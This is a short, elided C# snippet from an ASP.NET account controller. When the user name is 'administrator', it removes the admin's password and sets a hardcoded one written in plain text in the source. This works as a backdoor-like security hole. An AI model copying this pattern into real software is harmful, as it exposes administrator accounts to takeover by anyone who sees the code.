...
namespace EntertainmentTicketMaster.Controllers
{
    public class AccountController : Controller
    {
        ...
        {
            if (model.UserName.ToLower().Equals("administrator"))
            {
                var userAdmin = _repositoryServices.GetUserByName(model.UserName);
                UserManager.RemovePassword(userAdmin.ASPNetUserId);

                UserManager.AddPassword(userAdmin.ASPNetUserId, "0k3ll0N?!F:!T");
